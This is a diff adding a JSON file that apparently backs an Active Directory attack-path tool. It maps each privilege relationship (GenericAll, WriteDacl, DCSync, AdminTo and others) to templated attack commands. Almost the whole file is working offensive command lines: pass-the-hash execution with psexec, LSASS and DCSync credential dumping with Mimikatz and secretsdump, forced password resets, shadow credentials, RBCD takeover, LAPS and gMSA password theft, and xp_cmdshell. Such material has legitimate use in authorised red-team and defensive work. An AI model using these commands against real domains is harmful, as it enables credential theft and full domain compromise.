@@ -1,0 +1,366 @@
+{
+  "member_of": {
+    "edge_key": "member_of",
+    "source_key": "MemberOf",
+    "title": "Group Membership (inherited rights)",
+    "tool": "inherent",
+    "narrative": "No action needed — you already hold every right granted to {to}. Continue the chain using {to}'s privileges.",
+    "default_command": "# You inherit all rights of the group {to}. Enumerate what it can reach:\nGet-DomainGroup -Identity \"{to}\" | Select-Object memberof\nGet-DomainGroupMember -Identity \"{to}\"",
+    "by_target": {},
+    "mitre_id": "T1087.002",
+    "severity": "info",
+    "target_aware": false
+  },
+  "adminto": {
+    "edge_key": "adminto",
+    "source_key": "AdminTo",
+    "title": "Local Admin → Remote Code Execution",
+    "tool": "impacket / netexec",
+    "narrative": "{from} is local administrator on {to}. Execute code and dump credentials.",
+    "default_command": "# Run as {from} on {to}\nimpacket-psexec {DOMAIN}/{USERNAME}@{toShort} -hashes :{NTLM_HASH}\nnetexec smb {toShort} -u {USERNAME} -H {NTLM_HASH} --sam --lsa\nimpacket-secretsdump {DOMAIN}/{USERNAME}@{toShort} -hashes :{NTLM_HASH}",
+    "by_target": {},
+    "mitre_id": "T1021",
+    "severity": "high",
+    "target_aware": false
+  },
+  "has_session": {
+    "edge_key": "has_session",
+    "source_key": "HasSession",
+    "title": "Session → Credential Theft",
+    "tool": "Mimikatz / lsassy",
+    "narrative": "{to} has an active session on a host you control (or vice-versa). Dump LSASS to steal {to}'s credentials/TGT.",
+    "default_command": "# With local admin on the host, dump the logged-on creds of {to}\nnetexec smb {toShort} -u {USERNAME} -H {NTLM_HASH} -M lsassy\nmimikatz # sekurlsa::logonpasswords\nmimikatz # sekurlsa::tickets /export",
+    "by_target": {},
+    "mitre_id": "",
+    "severity": "info",
+    "target_aware": false
+  },
+  "can_rdp": {
+    "edge_key": "can_rdp",
+    "source_key": "CanRDP",
+    "title": "RDP Access",
+    "tool": "xfreerdp / evil-winrm",
+    "narrative": "{from} may log on to {to} via RDP.",
+    "default_command": "xfreerdp /v:{toShort} /u:{USERNAME} /p:{PASSWORD} +clipboard\n# Pass-the-hash RDP (restricted admin):\nxfreerdp /v:{toShort} /u:{USERNAME} /pth:{NTLM_HASH}",
+    "by_target": {},
+    "mitre_id": "",
+    "severity": "info",
+    "target_aware": false
+  },
+  "can_psremote": {
+    "edge_key": "can_psremote",
+    "source_key": "CanPSRemote",
+    "title": "WinRM / PowerShell Remoting",
+    "tool": "evil-winrm",
+    "narrative": "{from} can open a remote PowerShell session on {to}.",
+    "default_command": "evil-winrm -i {toShort} -u {USERNAME} -p {PASSWORD}\nevil-winrm -i {toShort} -u {USERNAME} -H {NTLM_HASH}",
+    "by_target": {},
+    "mitre_id": "",
+    "severity": "info",
+    "target_aware": false
+  },
+  "execute_dcom": {
+    "edge_key": "execute_dcom",
+    "source_key": "ExecuteDCOM",
+    "title": "DCOM Lateral Execution",
+    "tool": "impacket-dcomexec",
+    "narrative": "{from} can execute code on {to} via DCOM.",
+    "default_command": "impacket-dcomexec {DOMAIN}/{USERNAME}@{toShort} -hashes :{NTLM_HASH}",
+    "by_target": {},
+    "mitre_id": "",
+    "severity": "info",
+    "target_aware": false
+  },
+  "forcechangepassword": {
+    "edge_key": "forcechangepassword",
+    "source_key": "ForceChangePassword",
+    "title": "Force Reset Target Password",
+    "tool": "net rpc / PowerView",
+    "narrative": "{from} can reset the password of {to} without knowing the current one.",
+    "default_command": "# Linux\nnet rpc password \"{toShort}\" \"NewP@ss123!\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}\n# Windows (PowerView)\nSet-DomainUserPassword -Identity {toShort} -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)",
+    "by_target": {},
+    "mitre_id": "T1098",
+    "severity": "high",
+    "target_aware": false
+  },
+  "genericall": {
+    "edge_key": "genericall",
+    "source_key": "GenericAll",
+    "title": "Full Control (GenericAll)",
+    "tool": "PowerView / Certipy / pywhisker",
+    "narrative": "{from} has full control over {to}. The abuse depends on what {to} is — add member (group), reset password / Shadow Creds (user), RBCD / Read-LAPS (computer), or DCSync (domain).",
+    "default_command": "net rpc group addmem \"{toShort}\" \"{USERNAME}\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}",
+    "by_target": {
+      "group": {
+        "title": "GenericAll on Group → Add Yourself",
+        "command": "# Add yourself to {to}, then you inherit its rights\nnet rpc group addmem \"{toShort}\" \"{USERNAME}\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}\n# PowerView\nAdd-DomainGroupMember -Identity \"{toShort}\" -Members {USERNAME}"
+      },
+      "user": {
+        "title": "GenericAll on User → Reset PW / Shadow Creds",
+        "command": "# Reset the password\nnet rpc password \"{toShort}\" \"NewP@ss123!\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}\n# OR Shadow Credentials (stealthier, no pw change)\ncertipy shadow auto -u {USERNAME}@{DOMAIN} -p {PASSWORD} -account {toShort}"
+      },
+      "computer": {
+        "title": "GenericAll on Computer → RBCD / Shadow / LAPS",
+        "command": "# Shadow Credentials → auth as the machine\ncertipy shadow auto -u {USERNAME}@{DOMAIN} -p {PASSWORD} -account {toShort}\n# OR RBCD takeover\nimpacket-rbcd -delegate-from 'FAKE$' -delegate-to '{toShort}' -action write {DOMAIN}/{USERNAME}:{PASSWORD}\n# OR read its LAPS password\nnetexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} -M laps"
+      },
+      "domain": {
+        "title": "GenericAll on Domain → DCSync",
+        "command": "impacket-dacledit -action write -rights DCSync -principal {USERNAME} -target-dn \"{toDN}\" {DOMAIN}/{USERNAME}:{PASSWORD}\nimpacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc"
+      }
+    },
+    "mitre_id": "T1098",
+    "severity": "critical",
+    "target_aware": true
+  },
+  "genericwrite": {
+    "edge_key": "genericwrite",
+    "source_key": "GenericWrite",
+    "title": "Write Properties",
+    "tool": "PowerView / Rubeus / pywhisker",
+    "narrative": "{from} can write attributes of {to}. On a group → add a member; on a user → targeted Kerberoast or Shadow Creds; on a computer → RBCD or Shadow Creds.",
+    "default_command": "net rpc group addmem \"{toShort}\" \"{USERNAME}\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}",
+    "by_target": {
+      "group": {
+        "title": "GenericWrite on Group → Add Member",
+        "command": "# GenericWrite lets you edit the \"member\" attribute → add yourself\nnet rpc group addmem \"{toShort}\" \"{USERNAME}\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}\n# PowerView\nAdd-DomainGroupMember -Identity \"{toShort}\" -Members {USERNAME}"
+      },
+      "user": {
+        "title": "GenericWrite on User → Targeted Roast / Shadow",
+        "command": "# Targeted Kerberoast — set a fake SPN, roast, then clear it\nSet-DomainObject -Identity {toShort} -Set @{serviceprincipalname='fake/svc'}\nimpacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -request-user {toShort}\n# OR Shadow Credentials\npython3 pywhisker.py -d {DOMAIN} -u {USERNAME} -p {PASSWORD} --target {toShort} --action add"
+      },
+      "computer": {
+        "title": "GenericWrite on Computer → RBCD / Shadow",
+        "command": "certipy shadow auto -u {USERNAME}@{DOMAIN} -p {PASSWORD} -account {toShort}\nimpacket-rbcd -delegate-from 'FAKE$' -delegate-to '{toShort}' -action write {DOMAIN}/{USERNAME}:{PASSWORD}"
+      }
+    },
+    "mitre_id": "T1098",
+    "severity": "high",
+    "target_aware": true
+  },
+  "writedacl": {
+    "edge_key": "writedacl",
+    "source_key": "WriteDacl",
+    "title": "Write DACL → Grant Yourself Rights",
+    "tool": "impacket-dacledit / PowerView",
+    "narrative": "{from} can rewrite the ACL of {to}: grant yourself full control, then perform the matching abuse (add member for a group, DCSync for the domain).",
+    "default_command": "impacket-dacledit -action write -rights FullControl -principal {USERNAME} -target \"{toShort}\" {DOMAIN}/{USERNAME}:{PASSWORD}",
+    "by_target": {
+      "group": {
+        "title": "WriteDacl on Group → Grant Rights, then Add Member",
+        "command": "# 1. Grant yourself full control over the group\nimpacket-dacledit -action write -rights FullControl -principal {USERNAME} -target \"{toShort}\" {DOMAIN}/{USERNAME}:{PASSWORD}\n# 2. Now add yourself to it\nnet rpc group addmem \"{toShort}\" \"{USERNAME}\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}"
+      },
+      "user": {
+        "title": "WriteDacl on User → Grant Rights, then Reset PW",
+        "command": "impacket-dacledit -action write -rights FullControl -principal {USERNAME} -target \"{toShort}\" {DOMAIN}/{USERNAME}:{PASSWORD}\nnet rpc password \"{toShort}\" \"NewP@ss123!\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}"
+      },
+      "domain": {
+        "title": "WriteDacl on Domain → Grant DCSync",
+        "command": "impacket-dacledit -action write -rights DCSync -principal {USERNAME} -target-dn \"{toDN}\" {DOMAIN}/{USERNAME}:{PASSWORD}\nimpacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc"
+      }
+    },
+    "mitre_id": "T1098",
+    "severity": "critical",
+    "target_aware": true
+  },
+  "writeowner": {
+    "edge_key": "writeowner",
+    "source_key": "WriteOwner",
+    "title": "Take Ownership → Full Control",
+    "tool": "impacket-owneredit / PowerView",
+    "narrative": "{from} can set itself as owner of {to}, grant full control, then perform the matching abuse.",
+    "default_command": "# 1. Become owner  2. Grant yourself full control\nimpacket-owneredit -action write -new-owner {USERNAME} -target \"{toShort}\" {DOMAIN}/{USERNAME}:{PASSWORD}\nimpacket-dacledit -action write -rights FullControl -principal {USERNAME} -target \"{toShort}\" {DOMAIN}/{USERNAME}:{PASSWORD}",
+    "by_target": {
+      "group": {
+        "title": "WriteOwner on Group → Own, Grant, Add Member",
+        "command": "impacket-owneredit -action write -new-owner {USERNAME} -target \"{toShort}\" {DOMAIN}/{USERNAME}:{PASSWORD}\nimpacket-dacledit -action write -rights FullControl -principal {USERNAME} -target \"{toShort}\" {DOMAIN}/{USERNAME}:{PASSWORD}\nnet rpc group addmem \"{toShort}\" \"{USERNAME}\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}"
+      },
+      "user": {
+        "title": "WriteOwner on User → Own, Grant, Reset PW",
+        "command": "impacket-owneredit -action write -new-owner {USERNAME} -target \"{toShort}\" {DOMAIN}/{USERNAME}:{PASSWORD}\nimpacket-dacledit -action write -rights FullControl -principal {USERNAME} -target \"{toShort}\" {DOMAIN}/{USERNAME}:{PASSWORD}\nnet rpc password \"{toShort}\" \"NewP@ss123!\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}"
+      }
+    },
+    "mitre_id": "T1098",
+    "severity": "high",
+    "target_aware": true
+  },
+  "owns": {
+    "edge_key": "owns",
+    "source_key": "Owns",
+    "title": "Owner → Full Control",
+    "tool": "impacket-dacledit",
+    "narrative": "{from} owns {to}, so it can grant itself any right.",
+    "default_command": "impacket-dacledit -action write -rights FullControl -principal {USERNAME} -target \"{toShort}\" {DOMAIN}/{USERNAME}:{PASSWORD}",
+    "by_target": {},
+    "mitre_id": "T1078",
+    "severity": "critical",
+    "target_aware": false
+  },
+  "addmember": {
+    "edge_key": "addmember",
+    "source_key": "AddMember",
+    "title": "Add Member to Group",
+    "tool": "net rpc / PowerView",
+    "narrative": "{from} can add any principal to group {to}. Add yourself to inherit its rights.",
+    "default_command": "net rpc group addmem \"{toShort}\" \"{USERNAME}\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}\n# PowerView\nAdd-DomainGroupMember -Identity \"{toShort}\" -Members {USERNAME}",
+    "by_target": {},
+    "mitre_id": "T1098",
+    "severity": "critical",
+    "target_aware": false
+  },
+  "addself": {
+    "edge_key": "addself",
+    "source_key": "AddSelf",
+    "title": "Add Self to Group",
+    "tool": "net rpc",
+    "narrative": "{from} can add itself to group {to}.",
+    "default_command": "net rpc group addmem \"{toShort}\" \"{USERNAME}\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}",
+    "by_target": {},
+    "mitre_id": "T1098",
+    "severity": "critical",
+    "target_aware": false
+  },
+  "allextendedrights": {
+    "edge_key": "allextendedrights",
+    "source_key": "AllExtendedRights",
+    "title": "All Extended Rights → Reset PW / DCSync",
+    "tool": "PowerView / impacket",
+    "narrative": "{from} holds all extended rights on {to} (includes ForceChangePassword on a user, or DCSync on the domain).",
+    "default_command": "# User target → reset password:\nnet rpc password \"{toShort}\" \"NewP@ss123!\" -U \"{DOMAIN}\"/\"{USERNAME}\"%\"{PASSWORD}\" -S {DC_IP}\n# Domain target → DCSync:\nimpacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc",
+    "by_target": {},
+    "mitre_id": "",
+    "severity": "info",
+    "target_aware": false
+  },
+  "readlapspassword": {
+    "edge_key": "readlapspassword",
+    "source_key": "ReadLAPSPassword",
+    "title": "Read LAPS Local Admin Password",
+    "tool": "netexec / pyLAPS",
+    "narrative": "{from} can read the LAPS-managed local admin password of {to}.",
+    "default_command": "netexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} -M laps\npython3 pyLAPS.py --action get -d {DOMAIN} -u {USERNAME} -p {PASSWORD}",
+    "by_target": {},
+    "mitre_id": "T1555",
+    "severity": "high",
+    "target_aware": false
+  },
+  "readgmsapassword": {
+    "edge_key": "readgmsapassword",
+    "source_key": "ReadGMSAPassword",
+    "title": "Read gMSA Password",
+    "tool": "gMSADumper",
+    "narrative": "{from} can read the managed password blob of gMSA {to}.",
+    "default_command": "python3 gMSADumper.py -u {USERNAME} -p {PASSWORD} -d {DOMAIN}\nnetexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} --gmsa",
+    "by_target": {},
+    "mitre_id": "T1555",
+    "severity": "high",
+    "target_aware": false
+  },
+  "shadow_credentials": {
+    "edge_key": "shadow_credentials",
+    "source_key": "AddKeyCredentialLink",
+    "title": "Shadow Credentials (Key Credential)",
+    "tool": "pywhisker / Certipy",
+    "narrative": "{from} can add a Key Credential to {to} and authenticate as it via PKINIT.",
+    "default_command": "certipy shadow auto -u {USERNAME}@{DOMAIN} -p {PASSWORD} -account {toShort}\npython3 pywhisker.py -d {DOMAIN} -u {USERNAME} -p {PASSWORD} --target {toShort} --action add",
+    "by_target": {},
+    "mitre_id": "T1098",
+    "severity": "high",
+    "target_aware": false
+  },
+  "rbcd": {
+    "edge_key": "rbcd",
+    "source_key": "AddAllowedToAct",
+    "title": "Resource-Based Constrained Delegation",
+    "tool": "impacket / PowerView",
+    "narrative": "{from} can write msDS-AllowedToActOnBehalfOfOtherIdentity on {to} → RBCD takeover.",
+    "default_command": "impacket-addcomputer {DOMAIN}/{USERNAME}:{PASSWORD} -computer-name FAKE$ -computer-pass 'FakeP@ss1'\nimpacket-rbcd -delegate-from 'FAKE$' -delegate-to '{toShort}' -action write {DOMAIN}/{USERNAME}:{PASSWORD}\nimpacket-getST -spn cifs/{toShort} -impersonate Administrator '{DOMAIN}/FAKE$:FakeP@ss1'",
+    "by_target": {},
+    "mitre_id": "T1134.001",
+    "severity": "high",
+    "target_aware": false
+  },
+  "constrained_delegation": {
+    "edge_key": "constrained_delegation",
+    "source_key": "AllowedToDelegate",
+    "title": "Constrained Delegation (S4U)",
+    "tool": "Rubeus / impacket-getST",
+    "narrative": "{from} can impersonate any user to services {to} is allowed to delegate to.",
+    "default_command": "impacket-getST -spn cifs/{toShort} -impersonate Administrator -hashes :{NTLM_HASH} {DOMAIN}/{USERNAME}",
+    "by_target": {},
+    "mitre_id": "T1558",
+    "severity": "medium",
+    "target_aware": false
+  },
+  "dcsync": {
+    "edge_key": "dcsync",
+    "source_key": "DCSync",
+    "title": "DCSync — Dump All Domain Hashes",
+    "tool": "impacket-secretsdump / Mimikatz",
+    "narrative": "{from} can replicate directory changes — extract every credential including krbtgt.",
+    "default_command": "impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc\nmimikatz # lsadump::dcsync /domain:{DOMAIN} /user:krbtgt",
+    "by_target": {},
+    "mitre_id": "T1003.006",
+    "severity": "critical",
+    "target_aware": false
+  },
+  "getchanges": {
+    "edge_key": "getchanges",
+    "source_key": "GetChanges",
+    "title": "DCSync (partial right)",
+    "tool": "impacket-secretsdump",
+    "narrative": "{from} holds GetChanges; combined with GetChangesAll this enables DCSync.",
+    "default_command": "impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc",
+    "by_target": {},
+    "mitre_id": "",
+    "severity": "info",
+    "target_aware": false
+  },
+  "getchangesall": {
+    "edge_key": "getchangesall",
+    "source_key": "GetChangesAll",
+    "title": "DCSync (replication right)",
+    "tool": "impacket-secretsdump",
+    "narrative": "{from} holds GetChangesAll → DCSync the domain.",
+    "default_command": "impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc",
+    "by_target": {},
+    "mitre_id": "",
+    "severity": "info",
+    "target_aware": false
+  },
+  "sqladmin": {
+    "edge_key": "sqladmin",
+    "source_key": "SQLAdmin",
+    "title": "MSSQL Admin → Command Execution",
+    "tool": "impacket-mssqlclient",
+    "narrative": "{from} is sysadmin on the SQL instance of {to}.",
+    "default_command": "impacket-mssqlclient {DOMAIN}/{USERNAME}:{PASSWORD}@{toShort} -windows-auth\n# then: enable_xp_cmdshell ; xp_cmdshell whoami",
+    "by_target": {},
+    "mitre_id": "",
+    "severity": "info",
+    "target_aware": false
+  },
+  "has_sid_history": {
+    "edge_key": "has_sid_history",
+    "source_key": "HasSIDHistory",
+    "title": "SID History",
+    "tool": "inherent",
+    "narrative": "{from} carries the SID of {to} in SIDHistory — you already hold {to}'s access.",
+    "default_command": "# Access is automatic via SID History. Continue using {to}'s rights.",
+    "by_target": {},
+    "mitre_id": "",
+    "severity": "info",
+    "target_aware": false
+  },
+  "trusted_by": {
+    "edge_key": "trusted_by",
+    "source_key": "TrustedBy",
+    "title": "Domain Trust",
+    "tool": "Rubeus / impacket",
+    "narrative": "{to} trusts {from}. Forge an inter-realm ticket or abuse SID history to cross the boundary.",
+    "default_command": "impacket-raiseChild {DOMAIN}/{USERNAME}:{PASSWORD}\n# or forge trust ticket with the trust key (lsadump::trust /patch)",
+    "by_target": {},
+    "mitre_id": "",
+    "severity": "info",
+    "target_aware": false
+  }
+}
